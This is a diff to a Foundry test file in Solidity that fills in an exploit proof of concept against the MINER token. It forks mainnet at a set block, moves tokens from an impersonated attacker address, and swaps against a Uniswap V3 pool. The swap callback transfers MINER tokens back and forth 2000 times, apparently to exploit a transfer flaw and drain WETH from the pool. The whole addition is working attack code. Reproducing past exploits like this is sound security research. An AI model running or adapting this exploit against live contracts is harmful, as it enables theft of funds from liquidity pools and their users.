@@ -33,13 +33,41 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 19_226_508 - 1);
+        cheats.createSelectFork("mainnet", 19226507);
         cheats.label(address(MINER), "MINER");
         cheats.label(address(pool), "MINER_Pool");
         cheats.label(address(WETH), "WETH");
     }
 
-    function testExpolit() public {}
+    function testExpolit() public {
+        emit log_named_uint(
+            "Attacker ETH balance before exploit",
+            WETH.balanceOf(address(this))
+        );
+        cheats.startPrank(attacker);
+        emit log_named_address("Address", address(MINER));
+        emit log_named_address("Address", address(this));
+        emit log_named_address("Address", address(WETH));
+        emit log_named_address("Address", address(attacker));
+        emit log_named_uint("ll ", MINER.balanceOf(attacker));
+        MINER.transfer(address(this), MINER.balanceOf(attacker));
+        MINER.balanceOf(address(this));
+        emit log_named_uint("Weth", WETH.balanceOf(address(this)));
+        emit log_named_uint("Miner", MINER.balanceOf(address(this)));
+        cheats.stopPrank();
+        bool zeroForOne = false;
+        int256 amountSpecified = 999_999_999_999_999_998_000;
+        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
+        bytes memory data = abi.encodePacked(uint8(0x61));
+        pool.swap(
+            address(this),
+            zeroForOne,
+            amountSpecified,
+            sqrtPriceLimitX96,
+            data
+        );
+        emit log_named_uint("Attacker", WETH.balanceOf(address(this)));
+    }
 
     function uniswapV3SwapCallback(
         int256 amount0Delta,
@@ -47,5 +75,9 @@ contract ContractTest is Test {
         bytes calldata data
     ) external {
         MINER.balanceOf(address(this));
+        for (uint256 i = 0; i < 2000; i++) {
+            MINER.transfer(address(pool), 499_999_999_999_999_999);
+            MINER.transfer(address(this), 499_999_999_999_999_999);
+        }
     }
 }
